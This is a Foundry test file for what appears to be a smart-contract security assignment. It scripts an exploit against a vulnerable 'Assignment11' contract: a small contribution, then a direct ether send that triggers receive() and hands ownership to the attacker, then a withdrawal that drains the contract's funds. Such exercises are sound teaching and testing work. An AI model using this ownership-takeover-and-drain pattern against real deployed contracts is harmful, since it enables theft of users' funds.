// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Assignment11.sol";

contract Assignment11ExploitTest is Test {
    Assignment11 public target;
    address public attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        target = new Assignment11();
        vm.deal(address(target), 1 ether); // seed target with some funds
    }

    function testExploit() public {
        vm.startPrank(attacker);

        // Step 1: contribute with < 0.001 ether
        target.contribute{value: 0.0005 ether}();

        // Step 2: send ether directly to trigger receive()
        (bool success, ) = address(target).call{value: 0.0001 ether}("");
        require(success, "direct send failed");

        // Step 3: confirm ownership
        assertEq(target.owner(), attacker, "ownership not transferred");

        // Step 4: withdraw funds
        uint256 attackerBalanceBefore = attacker.balance;
        target.withdraw();
        uint256 attackerBalanceAfter = attacker.balance;

        assertGt(attackerBalanceAfter, attackerBalanceBefore, "funds not drained");

        vm.stopPrank();
    }
}
